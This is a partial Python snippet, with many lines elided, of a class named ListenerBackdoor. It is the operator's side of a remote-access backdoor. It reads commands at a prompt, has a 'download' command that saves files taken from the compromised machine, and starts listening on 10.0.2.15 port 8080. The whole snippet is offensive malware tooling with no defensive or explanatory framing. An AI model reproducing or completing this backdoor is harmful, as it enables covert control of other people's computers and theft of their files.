...
class ListenerBackdoor:
	...
	def start_listener(self):
		while True:
			command_input = input("==> ")
			#for python use raw_input and for python3 use input
			...
			try:
				...
				if command_input[0] == "download" and "Err!" not in command_output:
					command_output = self.save_file(command_input[1], command_output)
			except Exception:
				command_output = "Err!"
			print(command_output)

listener_backdoor = ListenerBackdoor("10.0.2.15", 8080)
listener_backdoor.start_listener()